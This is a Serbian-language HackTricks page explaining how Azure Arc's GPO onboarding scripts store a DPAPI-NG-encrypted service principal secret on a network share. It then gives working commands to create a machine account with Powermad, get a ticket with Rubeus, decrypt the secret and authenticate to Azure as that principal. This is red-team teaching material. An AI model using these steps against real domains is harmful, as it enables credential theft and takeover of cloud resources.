# Az - Azure Arc Vulnerable GPO Deploy Script

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

- Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
- Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
- Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
- **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### Identifikacija Problema

Azure Arc omogućava integraciju novih internih servera (pridruženih serverskih domena) u Azure Arc korišćenjem metode Group Policy Object (GPO). Da bi olakšao ovaj proces, Microsoft pruža set alata za implementaciju neophodnih za pokretanje postupka učlanjivanja. Unutar ArcEnableServerGroupPolicy.zip fajla, mogu se pronaći sledeći skriptovi: DeployGPO.ps1, EnableAzureArc.ps1 i AzureArcDeployment.psm1.

Prilikom izvršavanja, DeployGPO.ps1 skript vrši sledeće akcije:

1. Kreira Azure Arc Servers Onboarding GPO unutar lokalnog domena.
2. Kopira EnableAzureArc.ps1 skript za učlanjivanje na određeni mrežni deljeni resurs kreiran za proces učlanjivanja, koji takođe sadrži Windows instalacioni paket.

Prilikom pokretanja ovog skripta, sistem administratori moraju obezbediti dva glavna parametra: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Dodatno, potrebni su i drugi parametri kao što su domen, FQDN servera koji hostuje deljeni resurs, i naziv deljenog resursa. Dodatni detalji kao što su ID zakupca, grupa resursa i ostale neophodne informacije takođe moraju biti obezbeđene skriptu.

Enkriptovan tajni ključ se generiše u AzureArcDeploy direktorijumu na određenom deljenom resursu korišćenjem DPAPI-NG enkripcije. Enkriptovani tajni ključ se čuva u fajlu nazvanom encryptedServicePrincipalSecret. Dokazi o ovome mogu se pronaći u DeployGPO.ps1 skriptu, gde se enkripcija vrši pozivanjem ProtectBase64 sa $descriptor i $ServicePrincipalSecret kao ulazima. Deskriptor se sastoji od SID-ova grupa Domain Computer i Domain Controller, obezbeđujući da tajni ključ može biti dekriptovan samo od strane grupa za bezbednost Domain Controllers i Domain Computers, kako je navedeno u komentarima skripta.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Eksploatacija

Imamo sledeće uslove:

1. Uspešno smo prodrli u internu mrežu.
2. Imamo mogućnost da kreiramo ili preuzmemo kontrolu nad korisničkim računom na računaru unutar Active Directory-ja.
3. Otkrili smo deljeni mrežni resurs koji sadrži direktorijum AzureArcDeploy.

Postoji nekoliko metoda za dobijanje korisničkog računa mašine unutar AD okruženja. Jedna od najčešćih je iskorišćavanje kvote korisničkog računa mašine. Druga metoda uključuje kompromitovanje korisničkog računa mašine putem ranjivih ACL-ova ili različitih drugih loših konfiguracija.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Kada se dobije nalog mašine, moguće je autentifikovati se koristeći ovaj nalog. Možemo koristiti komandu runas.exe sa zastavicom netonly ili koristiti pass-the-ticket sa Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Kada imamo TGT za nalog našeg računara sačuvan u memoriji, možemo koristiti sledeći skript za dešifrovanje tajne servisnog principala.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativno, možemo koristiti [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

U ovom trenutku, možemo prikupiti preostale informacije potrebne za povezivanje sa Azure-om iz ArcInfo.json datoteke, koja je smeštena na istoj mrežnoj deljenoj lokaciji kao i datoteka encryptedServicePrincipalSecret. Ova datoteka sadrži detalje poput: TenantId, servicePrincipalClientId, ResourceGroup, i više. Sa ovim informacijama, možemo koristiti Azure CLI za autentifikaciju kao kompromitovani servisni princip.

## Reference

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

- Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
- Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
- Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
- **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
